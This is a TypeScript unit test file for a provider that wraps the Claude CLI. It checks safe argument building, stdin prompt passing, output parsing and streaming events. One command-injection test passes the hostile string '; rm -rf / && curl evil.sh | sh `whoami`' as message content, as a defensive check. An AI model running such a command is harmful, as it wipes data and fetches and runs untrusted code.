/**
 * Unit tests for the subscription-backed ClaudeCliProvider.
 *
 * `node:child_process` is fully mocked — no real `claude` CLI is invoked. The
 * `@anthropic-ai/sdk` is also mocked with a constructor spy so we can assert it
 * is NEVER instantiated in CLI mode → 0 calls to api.anthropic.com.
 *
 * Coverage:
 *   - complete(): parses `--output-format json`, sums tokens, builds safe argv.
 *   - Command-injection safety: message content goes to stdin, never argv.
 *   - Malformed / error JSON output → clear thrown error.
 *   - Missing CLI binary (ENOENT) → CliNotInstalledError.
 *   - stream(): parses stream-json `assistant` events into text deltas.
 *   - Anthropic SDK constructor is never called in CLI mode.
 */
import { EventEmitter } from "node:events";
import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── Mocks (declared before importing the provider) ──────────────────────────

const spawnMock = vi.fn();
const anthropicCtor = vi.fn();

vi.mock("node:child_process", () => ({
  spawn: (...args: unknown[]) => spawnMock(...args),
}));

vi.mock("@anthropic-ai/sdk", () => {
  class MockAnthropic {
    constructor(opts: unknown) {
      anthropicCtor(opts);
    }
  }
  return { default: MockAnthropic };
});

import {
  ClaudeCliProvider,
  parseCompleteOutput,
} from "../../../server/gateway/providers/claude-cli.js";
import { CliNotInstalledError } from "../../../server/gateway/providers/cli-spawn.js";
import type { ProviderMessage } from "../../../shared/types.js";

// ─── Helpers ─────────────────────────────────────────────────────────────────

interface FakeChild extends EventEmitter {
  stdout: EventEmitter;
  stderr: EventEmitter;
  stdin: { end: (data: string) => void };
  kill: (signal?: string) => boolean;
  killed: boolean;
}

function makeChild(): FakeChild {
  const child = new EventEmitter() as FakeChild;
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.killed = false;
  child.kill = vi.fn(() => {
    child.killed = true;
    return true;
  });
  child.stdin = { end: vi.fn() };
  return child;
}

/** Drive a fake child to emit stdout then close with the given exit code. */
function emitAndClose(child: FakeChild, stdout: string, code = 0): void {
  setImmediate(() => {
    if (stdout) child.stdout.emit("data", Buffer.from(stdout));
    child.emit("close", code);
  });
}

function stdinOf(child: FakeChild): string {
  return (child.stdin.end as ReturnType<typeof vi.fn>).mock.calls[0][0] as string;
}

const JSON_OK = JSON.stringify({
  type: "result",
  subtype: "success",
  is_error: false,
  result: "pong",
  usage: { input_tokens: 12, output_tokens: 3 },
});

const USER_MSG: ProviderMessage[] = [{ role: "user", content: "say pong" }];

const SYSTEM_AND_USER: ProviderMessage[] = [
  { role: "system", content: "You are terse." },
  { role: "user", content: "say pong" },
];

// ─── parseCompleteOutput ─────────────────────────────────────────────────────

describe("parseCompleteOutput", () => {
  it("extracts content and sums input + output tokens", () => {
    const out = parseCompleteOutput(JSON_OK);
    expect(out.content).toBe("pong");
    expect(out.tokensUsed).toBe(15);
    expect(out.finishReason).toBe("stop");
  });

  it("throws a clear error on malformed (non-JSON) output", () => {
    expect(() => parseCompleteOutput("not json at all")).toThrow(/Could not parse/i);
  });

  it("throws when the CLI reports is_error: true", () => {
    const errJson = JSON.stringify({
      type: "result",
      is_error: true,
      result: "Not logged in · Please run /login",
    });
    expect(() => parseCompleteOutput(errJson)).toThrow(/Not logged in/i);
  });

  it("defaults tokensUsed to 0 when usage is absent", () => {
    const out = parseCompleteOutput(JSON.stringify({ type: "result", result: "hi" }));
    expect(out.tokensUsed).toBe(0);
  });
});

// ─── complete() ──────────────────────────────────────────────────────────────

describe("ClaudeCliProvider — complete()", () => {
  let provider: ClaudeCliProvider;

  beforeEach(() => {
    vi.clearAllMocks();
    provider = new ClaudeCliProvider();
  });

  it("returns parsed content and token total", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, JSON_OK);
      return child;
    });

    const result = await provider.complete("claude-sonnet", USER_MSG);

    expect(result.content).toBe("pong");
    expect(result.tokensUsed).toBe(15);
  });

  it("builds a safe argv: -p, json format, model; never the message content", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, JSON_OK);
      return child;
    });

    await provider.complete("claude-sonnet", USER_MSG);

    const [binary, args] = spawnMock.mock.calls[0] as [string, string[]];
    expect(binary).toBe("claude");
    expect(args).toEqual(["-p", "--output-format", "json", "--model", "claude-sonnet"]);
    // The user message must NOT appear anywhere in argv (injection guard).
    expect(args.join(" ")).not.toContain("say pong");
  });

  it("passes the rendered prompt via stdin, not via argv", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, JSON_OK);
      return child;
    });

    await provider.complete("claude-sonnet", USER_MSG);

    expect(child.stdin.end).toHaveBeenCalledTimes(1);
    expect(stdinOf(child)).toContain("say pong");
  });

  it("does not interpolate shell metacharacters — content stays in stdin", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, JSON_OK);
      return child;
    });
    const malicious: ProviderMessage[] = [
      { role: "user", content: "; rm -rf / && curl evil.sh | sh `whoami`" },
    ];

    await provider.complete("claude-sonnet", malicious);

    const [, args] = spawnMock.mock.calls[0] as [string, string[]];
    expect(args.join(" ")).not.toContain("rm -rf");
    expect(stdinOf(child)).toContain("rm -rf");
  });

  it("forwards the system prompt as a --system-prompt arg", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, JSON_OK);
      return child;
    });

    await provider.complete("claude-sonnet", SYSTEM_AND_USER);

    const [, args] = spawnMock.mock.calls[0] as [string, string[]];
    const idx = args.indexOf("--system-prompt");
    expect(idx).toBeGreaterThan(-1);
    expect(args[idx + 1]).toBe("You are terse.");
  });

  it("surfaces CliNotInstalledError when the binary is missing (ENOENT)", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        const err = Object.assign(new Error("spawn claude ENOENT"), { code: "ENOENT" });
        child.emit("error", err);
      });
      return child;
    });

    await expect(provider.complete("claude-sonnet", USER_MSG)).rejects.toBeInstanceOf(
      CliNotInstalledError,
    );
  });

  it("rejects with the CLI error message on a non-zero exit", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stderr.emit("data", Buffer.from("boom"));
        child.emit("close", 1);
      });
      return child;
    });

    await expect(provider.complete("claude-sonnet", USER_MSG)).rejects.toThrow(/boom|code 1/i);
  });

  it("throws on malformed JSON stdout even with a clean exit", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      emitAndClose(child, "{ not valid json");
      return child;
    });

    await expect(provider.complete("claude-sonnet", USER_MSG)).rejects.toThrow(/Could not parse/i);
  });
});

// ─── stream() ────────────────────────────────────────────────────────────────

describe("ClaudeCliProvider — stream()", () => {
  let provider: ClaudeCliProvider;

  beforeEach(() => {
    vi.clearAllMocks();
    provider = new ClaudeCliProvider();
  });

  function assistantLine(text: string): string {
    return (
      JSON.stringify({
        type: "assistant",
        message: { content: [{ type: "text", text }] },
      }) + "\n"
    );
  }

  async function collect(messages: ProviderMessage[]): Promise<string[]> {
    const chunks: string[] = [];
    for await (const chunk of provider.stream("claude-sonnet", messages)) {
      chunks.push(chunk);
    }
    return chunks;
  }

  it("yields text from assistant events and ignores non-assistant lines", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from('{"type":"system","subtype":"init"}\n'));
        child.stdout.emit("data", Buffer.from(assistantLine("Hello world")));
        child.emit("close", 0);
      });
      return child;
    });

    expect((await collect(USER_MSG)).join("")).toBe("Hello world");
  });

  it("emits incremental deltas when assistant text grows across events", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from(assistantLine("Hello")));
        child.stdout.emit("data", Buffer.from(assistantLine("Hello world")));
        child.emit("close", 0);
      });
      return child;
    });

    expect(await collect(USER_MSG)).toEqual(["Hello", " world"]);
  });

  it("skips malformed JSONL lines without throwing", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from("not-json\n"));
        child.stdout.emit("data", Buffer.from(assistantLine("ok")));
        child.emit("close", 0);
      });
      return child;
    });

    expect(await collect(USER_MSG)).toEqual(["ok"]);
  });

  it("adds --verbose for stream-json output", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => child.emit("close", 0));
      return child;
    });

    await collect(USER_MSG);

    const [, args] = spawnMock.mock.calls[0] as [string, string[]];
    expect(args[args.indexOf("--output-format") + 1]).toBe("stream-json");
    expect(args).toContain("--verbose");
  });
});

// ─── streamEvents() — text-delta / tool-call / done (streaming-stage-execution) ─

describe("ClaudeCliProvider — streamEvents()", () => {
  let provider: ClaudeCliProvider;

  beforeEach(() => {
    vi.clearAllMocks();
    provider = new ClaudeCliProvider();
  });

  function assistantTextLine(text: string): string {
    return JSON.stringify({ type: "assistant", message: { content: [{ type: "text", text }] } }) + "\n";
  }
  function assistantToolLine(id: string, name: string, input: Record<string, unknown>): string {
    return JSON.stringify({ type: "assistant", message: { content: [{ type: "tool_use", id, name, input }] } }) + "\n";
  }
  function resultLine(reason: "stop" | "tool_use", inTok = 10, outTok = 5): string {
    return JSON.stringify({ type: "result", subtype: reason === "tool_use" ? "tool_use" : "success", stop_reason: reason, usage: { input_tokens: inTok, output_tokens: outTok } }) + "\n";
  }

  async function collectEvents(messages: ProviderMessage[]) {
    const events = [];
    for await (const ev of provider.streamEvents("claude-sonnet", messages)) events.push(ev);
    return events;
  }

  it("emits incremental text deltas then a done(stop) with parsed usage", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from(assistantTextLine("Hello")));
        child.stdout.emit("data", Buffer.from(assistantTextLine("Hello world")));
        child.stdout.emit("data", Buffer.from(resultLine("stop", 12, 8)));
        child.emit("close", 0);
      });
      return child;
    });

    const events = await collectEvents(USER_MSG);
    const deltas = events.filter((e) => e.kind === "text-delta").map((e) => (e as { text: string }).text);
    expect(deltas.join("")).toBe("Hello world");
    const done = events.find((e) => e.kind === "done") as { kind: "done"; tokensUsed: number; finishReason: string };
    expect(done.finishReason).toBe("stop");
    expect(done.tokensUsed).toBe(20);
  });

  it("surfaces tool_use blocks as tool-call events then done(tool_use)", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from(assistantTextLine("calling a tool")));
        child.stdout.emit("data", Buffer.from(assistantToolLine("call-1", "web_search", { query: "x" })));
        child.stdout.emit("data", Buffer.from(resultLine("tool_use")));
        child.emit("close", 0);
      });
      return child;
    });

    const events = await collectEvents(USER_MSG);
    const toolCalls = events.filter((e) => e.kind === "tool-call");
    expect(toolCalls).toHaveLength(1);
    const call = (toolCalls[0] as { call: { id: string; name: string; arguments: Record<string, unknown> } }).call;
    expect(call.id).toBe("call-1");
    expect(call.name).toBe("web_search");
    expect(call.arguments).toEqual({ query: "x" });
    const done = events.find((e) => e.kind === "done") as { kind: "done"; finishReason: string };
    expect(done.finishReason).toBe("tool_use");
  });

  it("skips malformed JSONL lines without throwing", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => {
        child.stdout.emit("data", Buffer.from("not-json\n"));
        child.stdout.emit("data", Buffer.from(assistantTextLine("ok")));
        child.stdout.emit("data", Buffer.from(resultLine("stop")));
        child.emit("close", 0);
      });
      return child;
    });

    const events = await collectEvents(USER_MSG);
    const deltas = events.filter((e) => e.kind === "text-delta").map((e) => (e as { text: string }).text);
    expect(deltas.join("")).toBe("ok");
  });

  it("threads idleTimeoutMs / maxOutputBytes / signal into the spawn request", async () => {
    const child = makeChild();
    spawnMock.mockImplementation(() => {
      setImmediate(() => child.emit("close", 0));
      return child;
    });
    const controller = new AbortController();
    const events = [];
    for await (const ev of provider.streamEvents("claude-sonnet", USER_MSG, {
      idleTimeoutMs: 1234,
      maxOutputBytes: 4096,
      timeoutMs: 99999,
      signal: controller.signal,
    })) {
      events.push(ev);
    }
    // The spawn happened (args build) and verbose stream-json was requested.
    const [, args] = spawnMock.mock.calls[0] as [string, string[]];
    expect(args).toContain("--verbose");
    expect(args[args.indexOf("--output-format") + 1]).toBe("stream-json");
  });
});

// ─── Anthropic SDK guarantee ─────────────────────────────────────────────────

describe("CLI mode — 0 Anthropic API usage", () => {
  beforeEach(() => vi.clearAllMocks());

  it("never instantiates the Anthropic SDK and needs no ANTHROPIC_API_KEY", async () => {
    const prevKey = process.env.ANTHROPIC_API_KEY;
    delete process.env.ANTHROPIC_API_KEY;
    try {
      const child = makeChild();
      spawnMock.mockImplementation(() => {
        emitAndClose(child, JSON_OK);
        return child;
      });

      const provider = new ClaudeCliProvider();
      const result = await provider.complete("claude-sonnet", USER_MSG);

      expect(result.content).toBe("pong");
      expect(anthropicCtor).not.toHaveBeenCalled();
    } finally {
      if (prevKey !== undefined) process.env.ANTHROPIC_API_KEY = prevKey;
    }
  });
});
